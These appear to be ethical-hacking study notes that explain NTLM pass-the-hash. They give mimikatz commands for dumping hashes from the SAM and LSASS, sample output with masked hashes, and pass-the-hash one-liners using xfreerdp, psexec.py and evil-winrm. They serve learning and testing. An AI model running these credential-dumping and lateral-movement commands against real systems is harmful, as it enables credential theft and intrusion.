# Pass-the-Hash (NTLM)

Refer to the following resources for more information on the relevant topics:

1. &#x20;[pass-the-hash](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/tools/mimikatz/pass-the-hash) attack.
2. [NetNTLM](https://jarrettgxz-sec.gitbook.io/windows/active-directory-ad/authentication-methods/netntlm) authentication

The Pass-the-Hash (PtH) method relies on the way the NTLM authentication process works, where a user can authenticate to a Windows domain configured to use NTLM authentication just by merely knowing the NTLM hash. Thus, we won't even have to crack the NTLM hashes as we will not require the actual password to authenticate successfully.

Mimikatz provides 2 methods to retrieve the NTML hashes:

a. Local SAM&#x20;

b. LSASS memory

Ensure to perform the necessary actions before we attempt to harvest the credentials. Refer to the [following](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/tools/mimikatz) for more information on each module.

```
mimikatz # privilege::debug
mimikatz # token::elevate
```

### (1) Local SAM

This method will only allow us to retrieve hashes from the local users on the machine only (No domain user's hashes).

{% code overflow="wrap" %}
```
mimikatz # lsadump::sam
```
{% endcode %}

Eg. We have found the username `test.user` with the NTLM hash value `1b2axxxx` :

```
mimikatz # lsadump::sam

RID  : xxxx
User : jarrett.gxz
  Hash NTLM: 1b2axxxx
```

### (2) LSASS memory

```
mimikatz # sekurlsa::msv
```

Eg. We have found the username `jarrett.gxz` in the domain `test.domain`, with the NTLM hash value `1b2axxxx` :

```
mimikatz # sekurlsa::msv

Authentication Id : xxxx
Session           : xxxx 
User Name         : jarrett.gxz
Domain            : TEST
...
        msv :
         [00000003] Primary
         * Username : test.user
         * Domain   : test.domain
         * NTLM     : 1b2axxxx
```

### Perform Pass-the-Hash

{% code overflow="wrap" %}
```
mimikatz # token::revert 

mimikatz # sekurlsa::pth /user jarrett.goh /domain:test.domain /ntlm:1b2axxxx /run:"<payload>"
```
{% endcode %}

> Note we first have to run `token::revert` to revert back to our original token privileges, as trying to pass-the-hash with an elevated token won't work

We can view the `sekurlsa::pth` module command as equivalent to using the [`runas /netonly`](https://jarrettgxz-sec.gitbook.io/penetration-testing-ethical-hacking-concepts/windows-active-directory/enumeration/runas.exe) command with a hash instead of a password.

### PtH with Linux

Several tools exists in Linux, with built-in support to perform PtH. The following outlines a few:

1. `xfreerdp`

{% embed url="https://www.kali.org/blog/passing-hash-remote-desktop/" %}

```sh
$ xfreerdp /v:VICTIM_IP /u:DOMAIN\\MyUser /pth:NTLM_HASH
```

2. `psexec.py`

{% embed url="https://www.kali.org/tools/impacket-scripts/#impacket-psexec" %}

```sh
$ psexec.py -hashes NTLM_HASH domain/<username>@<target>
```

3. `evil-winrm`

{% embed url="https://www.kali.org/tools/evil-winrm/" %}

```sh
$ evil-winrm -i <target> -u <username> -H NTLM_HASH
```

